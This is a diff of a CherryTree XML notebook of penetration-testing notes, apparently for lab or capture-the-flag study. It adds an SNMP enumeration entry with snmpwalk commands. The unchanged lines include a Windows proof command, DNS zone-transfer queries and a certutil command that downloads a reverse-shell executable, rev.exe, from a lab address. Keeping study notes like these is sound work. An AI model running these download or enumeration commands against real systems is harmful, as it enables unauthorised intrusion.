@@ -111,7 +111,7 @@ Windows Proof: </rich_text>
         <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
       </node>
     </node>
-    <node name="Methodology" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684267948" ts_lastsave="1701300242">
+    <node name="Methodology" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684267948" ts_lastsave="1706989762">
       <rich_text>
 ☐ </rich_text>
       <rich_text link="node 36">nmap</rich_text>
@@ -139,6 +139,9 @@ Windows Proof: </rich_text>
       <rich_text>
 ☐ </rich_text>
       <rich_text link="node 42">PrivEsc</rich_text>
+      <rich_text>
+☐ </rich_text>
+      <rich_text link="node 106">SNMP</rich_text>
       <node name="Brute Force" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690684">
         <rich_text> </rich_text>
         <node name="Hydra" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1689800025">
@@ -889,7 +892,9 @@ powershell.exe -NoProfile -encoded $Encoded</rich_text>
 
 or
 
-
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
 
 </rich_text>
           <codebox char_offset="665" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">certutil -urlcache -f http://10.10.14.21/rev.exe rev.exe</codebox>
@@ -3095,7 +3100,9 @@ ________________________________________________________________________________
    
    or
    
-   
+   </rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
    
    
 
@@ -3215,6 +3222,20 @@ once u know the subdomain u can use this for a dnz zonetransfer to identify more
         <rich_text justification="left"></rich_text>
         <codebox char_offset="25" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nslookup 10.11.1. 10.11.1. </codebox>
         <codebox char_offset="123" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig axfr @10.11.1 cronos.htb</codebox>
+      </node>
+      <node name="SNMP" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1706989717" ts_lastsave="1706994186">
+        <rich_text>
+Use SNMP walk like:
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+or
+
+</rich_text>
+        <codebox char_offset="22" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v1 -c public 10.11.1.</codebox>
+        <codebox char_offset="29" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v2c -c public 10.11.1.</codebox>
       </node>
     </node>
   </node>
